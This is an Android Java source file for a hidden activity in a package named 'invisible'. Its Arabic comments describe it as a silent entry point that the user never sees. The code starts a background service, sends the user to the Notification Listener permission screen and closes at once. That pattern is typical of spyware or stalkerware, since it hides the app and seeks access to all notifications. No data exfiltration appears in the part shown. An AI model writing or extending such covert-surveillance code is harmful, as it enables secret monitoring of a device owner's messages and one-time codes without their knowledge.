package com.invisible;

import android.app.Activity;
import android.content.Intent;
import android.os.Bundle;

/**
 * نشاط مخفي - ما يظهرش للمستخدم
 * يستعمل كنقطة دخول صامتة ويفتح شاشة الصلاحيات ويقفل فوراً
 */
public class HideActivity extends Activity {

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        // تشغيل الخدمة إذا مش شغالة
        Intent serviceIntent = new Intent(this, MainService.class);
        if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.O) {
            startForegroundService(serviceIntent);
        } else {
            startService(serviceIntent);
        }

        // محاولة فتح صفحة صلاحية Notification Listener
        try {
            Intent notifIntent = new Intent(
                    "android.settings.ACTION_NOTIFICATION_LISTENER_SETTINGS");
            notifIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            startActivity(notifIntent);
        } catch (Exception ignored) {}

        // قفل النشاط فوراً
        finish();

        // إذا كان Android 11+ وما قدرش يقفل النشاط من الخلفية
        // المستخدم راح يشوف صفحة الصلاحيات فقط
    }
}
